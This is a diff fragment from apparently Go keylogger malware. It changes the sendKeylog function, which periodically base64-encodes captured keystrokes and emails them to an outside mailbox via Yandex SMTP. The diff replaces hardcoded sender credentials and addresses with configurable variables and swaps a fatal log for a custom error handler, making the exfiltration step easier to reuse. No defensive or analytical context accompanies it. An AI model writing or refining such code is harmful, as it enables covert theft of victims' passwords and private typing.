@@ -46,10 +46,10 @@ func sendKeylog()  {
 		time.Sleep(time.Duration(keyloggerInterval)* time.Minute)
 		base64Encode(tmpKeylog)
 
-		auth := smtp.PlainAuth("", "some@ya.ru", "password", "smtp.yandex.ru")
-		err := smtp.SendMail("smtp.yandex.ru:25", auth, "from@ya.ru", []string{"to@ya.ru"}, []byte(tmpKeylog))
+		auth := smtp.PlainAuth(identetyMail, userNameMail, passwordMail, hostSmtp)
+		err := smtp.SendMail(addrMail, auth, fromMail, []string{toMail}, []byte(tmpKeylog))
 		if err != nil {
-			log.Fatal(err)
+			ChekErrors(err)
 			}
 		}
 	}
